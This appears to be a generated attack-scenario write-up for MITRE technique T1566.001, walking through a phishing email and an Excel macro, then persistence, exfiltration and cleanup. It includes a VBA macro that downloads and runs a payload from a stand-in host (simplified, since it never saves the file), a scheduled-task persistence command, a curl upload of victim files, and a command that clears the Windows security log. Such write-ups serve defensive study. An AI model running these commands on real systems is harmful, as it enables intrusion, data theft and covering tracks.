@@ -1,0 +1,75 @@
+<output>
+Pattern Name: T1566.001 - Spearphishing Attachment
+Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, leveraging various applications such as Outlook for email, Excel for executing the payload, and potentially a web browser for further exploitation or data exfiltration.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Applications Involved**: Outlook
+- **User Action**: The victim receives an email that appears to be from a trusted source, containing a malicious Excel attachment.
+- **Key Artifacts**: 
+  - Email Subject: "Important Update Required"
+  - Attachment: "Update_Invoice.xlsx"
+  
+```shell
+# The attacker sends a spearphishing email with a malicious attachment.
+# The email is crafted to appear legitimate to increase the likelihood of the victim opening it.
+```
+
+**Stage 2: Execution of Malicious Payload**
+- **Applications Involved**: Excel
+- **User Action**: The victim opens the attachment, which prompts them to enable macros to view the content.
+- **Key Artifacts**: 
+  - Excel Macro: `Auto_Open()`
+  - Malicious Code: Downloads a payload from a remote server.
+
+```shell
+# The macro executes upon opening the document, downloading a malicious payload.
+# Example of a macro that could be used:
+Sub Auto_Open()
+    Dim objHTTP As Object
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    objHTTP.Open "GET", "http://malicious-server.com/payload.exe", False
+    objHTTP.send
+    ' Execute the downloaded payload
+    Shell "C:\Users\Victim\Downloads\payload.exe"
+End Sub
+```
+
+**Stage 3: Establishing Persistence**
+- **Applications Involved**: Windows Explorer, Task Scheduler
+- **User Action**: The malicious payload installs a backdoor and creates a scheduled task for persistence.
+- **Key Artifacts**: 
+  - Scheduled Task: "UpdateTask"
+  - Backdoor executable: "C:\ProgramData\malicious.exe"
+
+```shell
+# The payload creates a scheduled task to ensure persistence.
+schtasks /create /tn "UpdateTask" /tr "C:\ProgramData\malicious.exe" /sc onlogon /rl highest
+```
+
+**Stage 4: Data Exfiltration**
+- **Applications Involved**: Web Browser (Chrome), Cloud Storage Service (Google Drive)
+- **User Action**: The attacker uses the compromised system to upload sensitive files to a cloud storage service.
+- **Key Artifacts**: 
+  - File: "sensitive_data.docx"
+  - Upload URL: "https://drive.google.com/upload"
+
+```shell
+# The attacker uses a web browser to upload files to Google Drive.
+# This could be automated via a script or manually done by the attacker.
+curl -X POST -F "file=@C:\Users\Victim\Documents\sensitive_data.docx" "https://drive.google.com/upload"
+```
+
+**Stage 5: Cleanup and Covering Tracks**
+- **Applications Involved**: Windows Command Prompt
+- **User Action**: The attacker deletes logs and any evidence of the attack.
+- **Key Artifacts**: 
+  - Command to delete logs: "C:\Windows\System32\wevtutil.exe cl Security"
+
+```shell
+# The attacker clears event logs to cover their tracks.
+C:\Windows\System32\wevtutil.exe cl Security
+```
+
+</output>
